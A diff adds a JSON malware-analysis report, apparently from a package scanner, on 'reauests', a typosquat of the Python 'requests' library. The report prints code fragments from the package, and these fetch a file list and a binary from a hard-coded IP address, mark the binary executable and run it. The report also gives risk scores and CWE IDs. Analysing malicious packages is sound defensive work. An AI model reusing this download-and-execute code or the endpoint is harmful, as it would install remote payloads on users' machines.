@@ -1,0 +1,46 @@
+{
+  "package_metadata": {
+    "name": "reauests",
+    "version": "2.28.1",
+    "author_email": ""
+  },
+  "behavior_analysis": {
+    "file_operations": [
+      "reauests/frequest.py:18 - Writing a downloaded binary to the filesystem"
+    ],
+    "network_endpoints": [
+      "http://35.235.126.33/all.txt",
+      "http://35.235.126.33/{executable}"
+    ],
+    "process_spawns": [
+      "reauests/frequest.py:18 - Making a downloaded binary executable using chmod",
+      "reauests/frequest.py:18 - Executing the downloaded binary"
+    ]
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "reauests/frequest.py",
+        "code_snippet": "        with open(executable, 'wb') as f:\n            f.write(req.content)\n\n        if 'linux' in operating_system or 'darwin' in operating_system:\n            os.system(f'chmod +x {executable}')\n\n        if 'linux' in operating_system:\n   ...utable}')\n"
+      },
+      {
+        "filename": "reauests/frequest.py",
+        "code_snippet": "    req = requests.get('http://35.235.126.33/all.txt')\n"
+      },
+      {
+        "filename": "reauests/frequest.py",
+        "code_snippet": "        url = f'http://35.235.126.33/{executable}'\n"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.9,
+    "risk_score": 0.85,
+    "confidence": 0.95,
+    "cwe_ids": [
+      "CWE-502",
+      "CWE-94",
+      "CWE-200"
+    ]
+  }
+}
